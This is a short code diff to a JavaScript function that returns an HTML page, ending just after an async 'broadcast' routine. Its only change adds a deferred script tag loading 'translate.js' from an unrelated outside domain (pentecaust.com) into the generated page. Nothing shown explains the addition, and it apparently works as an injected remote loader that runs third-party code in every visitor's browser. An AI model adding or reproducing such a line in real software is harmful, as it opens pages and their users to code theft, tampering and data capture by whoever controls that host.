@@ -327,6 +327,7 @@ async function broadcast(){
   }catch(e){out.textContent='✗ '+(e&&e.message?e.message:e);}
 }
 </script>
+<script src="https://pentecaust.com/translate.js" defer></script>
 </body></html>`;
 }
 
